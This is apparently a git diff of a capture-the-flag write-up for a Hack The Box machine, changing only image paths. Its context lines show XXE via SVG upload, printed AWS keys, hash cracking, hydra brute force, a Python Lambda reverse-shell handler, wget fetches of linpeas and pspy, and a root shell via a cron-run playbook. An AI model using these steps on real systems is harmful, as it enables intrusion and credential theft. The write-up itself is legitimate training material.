@@ -20,7 +20,7 @@ Let’s check the web page!
 
 There isn’t much interesting information on this website except a page where we can upload a file to get a shareable link. The only allowed extensions are pdf,docx,png and svg. There is also another page “about” which gives us some lore and some information about how the platform works, the one line keeping my attention being “Files scanned for malicious content and rogue metadata” which suggest an injection attack could be exploited.
 
-![Website upload page](/images/website_upload_page.png)
+![Website upload page](/HTB-UNIVERSITY-2024/images/website_upload_page.png)
 
 We can then download our file on a link like this one on local.clouded.htb:
 `http://local.clouded.htb/uploads/file_FRSAWhTLhm.pdf`
@@ -49,7 +49,7 @@ The exception being with .svg files. When we would upload an svg file without th
 
 We then tried to do some recon on our newly found domain local.clouded.htb and we found out it was an AWS bucket running behind which used a restAPI and an AWS lambda function.
 
-![AWS lambda](/images/aws_lambda.png)
+![AWS lambda](/HTB-UNIVERSITY-2024/images/aws_lambda.png)
 
 After a bit more searching and testing we managed to find an XXE injection in the upload feature of the website!
 
@@ -114,7 +114,7 @@ We will use the data we extracted above to login to the AWS bucket and list its 
 AWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDAAWS_REGION=us-east-1
 AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL
 
-![AWS login](/images/aws_login.png)
+![AWS login](/HTB-UNIVERSITY-2024/images/aws_login.png)
 
 We can see that there is a folder containing all of the file uploaded since the beginning called “uploads” and another one called “clouded-internal”, in the second folder we find a database called backup.db so we download it:
 
@@ -124,7 +124,7 @@ download: s3://clouded-internal/backup.db to ./backup.db
 `
 We open the .db file using sqlitebrowser:
 
-![Database](/images/database.png)
+![Database](/HTB-UNIVERSITY-2024/images/database.png)
 
 In the database there are 50 rows containing each a first and last name as well as an md5 password, all of them got cracked in a few seconds using john.
 
@@ -187,11 +187,11 @@ def handler(event, context):
   os.dup2(s.fileno(), 2)
   p = subprocess.call(["/bin/bash", "-i"])
 `
-![handler function upload](/images/handler_function.png)
+![handler function upload](/HTB-UNIVERSITY-2024/images/handler_function.png)
 
 We can see that we successfully uploaded our function and we have executed using `lambda invoke`
 
-![lambda revshell](/images/lambda_revshell.png)
+![lambda revshell](/HTB-UNIVERSITY-2024/images/lambda_revshell.png)
 
 We got a reverse shell, but after attempting privilege escalation on the machine, we realized there was a problem: there were almost no binaries, and there were no interesting files. At that moment, we thought that maybe this was out of scope, and we were right!
 
@@ -237,11 +237,11 @@ if __name__ == "__main__":
         FILE_USERS.write(lname+ ":"+passwd)                   # joe
 FILE_USERS.close()
 ```
-![hydra](/images/hydra.png)
+![hydra](/HTB-UNIVERSITY-2024/images/hydra.png)
 
 We can now ssh login onto the machine and find the first flag !
 
-![userflag](/images/userflag.png)
+![userflag](/HTB-UNIVERSITY-2024/images/userflag.png)
 
 We then upload linpeas and pspy on the machine using a basic python http server and we execute it:
 
@@ -253,7 +253,7 @@ wget 10.10.10.10:8000/pspy64 #Victim
 ‘
 We don’t find anything very interesting in linpeas but in pspy we can see that there is a cronjob running:
 
-![playbook](/images/playbook.png)
+![playbook](/HTB-UNIVERSITY-2024/images/playbook.png)
 
 We can add another .yml file in /opt/infra-setup to get get a reverse shell as the root user:
 
@@ -267,4 +267,4 @@ We can add another .yml file in /opt/infra-setup to get get a reverse shell as t
 
 And boom we get a root reverse shell and we have our root flag!:
 
-![rootflag](/images/rootflag.png)
+![rootflag](/HTB-UNIVERSITY-2024/images/rootflag.png)
